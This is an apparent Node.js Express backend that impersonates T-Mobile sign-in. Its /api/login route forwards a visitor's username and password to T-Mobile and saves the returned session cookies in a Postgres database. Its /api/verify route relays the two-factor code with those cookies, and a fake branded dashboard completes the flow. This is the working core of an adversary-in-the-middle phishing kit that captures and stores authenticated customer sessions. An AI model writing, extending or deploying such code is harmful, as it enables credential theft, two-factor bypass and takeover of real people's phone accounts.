require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');
const path = require('path');
const { Pool } = require('pg');

const app = express();
const PORT = process.env.PORT || 3000;

// Neon DB Connection
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false } // Required for Neon/AWS connectivity
});

// Middleware
app.use(cors());
app.use(cookieParser());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

function generateSessionId() {
    return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}

app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        
        const response = await axios.post('https://account.t-mobile.com/signin', {
            username,
            password
        }, {
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        });
        
        const sessionId = generateSessionId();
        const cookies = response.headers['set-cookie'] ? response.headers['set-cookie'].join('; ') : '';

        // SAVE TO NEON DB instead of local object
        await pool.query(
            'INSERT INTO sessions (id, cookies, created_at) VALUES ($1, $2, NOW())',
            [sessionId, cookies]
        );
        
        if (response.data.requiresVerification) {
            res.json({ requiresVerification: true, sessionId });
        } else {
            res.json({ success: true, sessionId });
        }
    } catch (error) {
        console.error('Login error:', error.message);
        res.status(500).json({ success: false, message: 'Login failed.' });
    }
});

app.post('/api/verify', async (req, res) => {
    try {
        const { code, sessionId } = req.body;
        
        // RETRIEVE FROM NEON DB
        const result = await pool.query('SELECT cookies FROM sessions WHERE id = $1', [sessionId]);
        
        if (result.rows.length === 0) {
            return res.status(400).json({ success: false, message: 'Invalid session.' });
        }
        
        const cookies = result.rows[0].cookies;

        const response = await axios.post('https://account.t-mobile.com/verify', { code }, {
            headers: {
                'Content-Type': 'application/json',
                'Cookie': cookies
            }
        });
        
        if (response.data.success) {
            res.json({ success: true, message: 'Verification successful' });
        } else {
            res.json({ success: false, message: 'Invalid verification code' });
        }
    } catch (error) {
        console.error('Verification error:', error.message);
        res.status(500).json({ success: false, message: 'Verification failed.' });
    }
});

// Dashboard endpoint
app.get('/dashboard', (req, res) => {
    res.send(`
        <html>
        <head>
            <title>T-Mobile Dashboard</title>
            <style>
                body { font-family: Arial, sans-serif; padding: 20px; }
                .container { max-width: 800px; margin: 0 auto; }
                .header { background-color: #e20074; color: white; padding: 10px; }
                .content { padding: 20px; background-color: #f9f9f9; margin-top: 20px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>T-Mobile Dashboard</h1>
                </div>
                <div class="content">
                    <h2>Welcome to your T-Mobile account</h2>
                    <p>This is a simulated dashboard. In a real implementation, this would display the user's account information retrieved via the Neon DB session.</p>
                    <a href="/">Log out</a>
                </div>
            </div>
        </body>
        </html>
    `);
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});